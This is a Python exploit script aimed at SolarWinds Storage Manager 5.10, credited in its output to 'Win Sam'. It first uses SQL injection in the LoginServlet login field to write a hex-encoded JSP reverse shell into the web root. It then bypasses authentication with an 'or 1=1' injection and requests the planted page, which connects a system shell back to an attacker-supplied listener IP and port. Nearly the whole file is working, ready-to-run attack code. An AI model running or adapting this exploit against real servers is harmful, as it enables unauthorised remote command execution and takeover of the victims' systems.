#!/usr/bin/python
import re,sys,requests
import time
import string
import random
import binascii as bs

def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

victimip=sys.argv[1]
listenerip=sys.argv[2]
listenerport=sys.argv[3]
url ="http://%s:9000/LoginServlet"%victimip

virus="""<%@page import="java.lang.*"%><%@page import="java.util.*"%><%@page import="java.io.*"%><%@page import="java.net.*"%><%class StreamConnector extends Thread{InputStream wy;OutputStream so; StreamConnector( InputStream wy, OutputStream so )    {      this.wy = wy;      this.so = so;    }    public void run()    {      BufferedReader bu  = null;      BufferedWriter xog = null;      try      {        bu  = new BufferedReader( new InputStreamReader( this.wy ) );        xog = new BufferedWriter( new OutputStreamWriter( this.so ) );        char buffer[] = new char[8192];        int length;        while( ( length = bu.read( buffer, 0, buffer.length ) ) > 0 )        {          xog.write( buffer, 0, length );          xog.flush();        }      } catch( Exception e ){}      try      {        if( bu != null )          bu.close();        if( xog != null )          xog.close();      } catch( Exception e ){}    }  }  try  {    String ShellPath;if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {  ShellPath = new String("/bin/sh");} else {  ShellPath = new String("cmd.exe");}    Socket socket = new Socket( """
virus_part2= "\"" + listenerip +"\"," + listenerport + ");"
virus_part3= """Process process = Runtime.getRuntime().exec( ShellPath );    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  } catch( Exception e ) {}%>"""
final = virus + virus_part2+ virus_part3
#print final


proxies = {
'http': 'http://127.0.0.1:8080',
}
print "(+) SolarWinds Storage Manager 5.10"
print "(+) Author:Win Sam"

rand=randomString()
directory='"C:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s.jsp"'% rand
path="'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile %s #" %(bs.hexlify(final), directory)
data="loginState=checkLogin&loginName=" + path  + "&password="
headers={"Content-Type":"application/x-www-form-urlencoded"}
print "(+) Uploading Malicious file using SQL Injection"
requests.post(url, data=data, headers=headers)
print "(+) Successfully write into server"
url2="http://%s:9000/LoginServlet" % victimip

print "(+) Launching Authentication Bypass"
data="loginState=checkLogin&loginName=%27+or+1%3D1%23&password=aa"
aa=requests.post(url2,headers=headers,data=data)
mycookie = aa.cookies['JSESSIONID']
cookies = {'JSESSIONID':'%s'%mycookie}

print "(+) Cookies Found"
print cookies
print "(+) Triggering the payload"
url3="http://%s:9000/%s.jsp"%(victimip,rand)
print "(+) Payload at %s" %url3
headers={'User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate'}
requests.get(url3, cookies=cookies).text
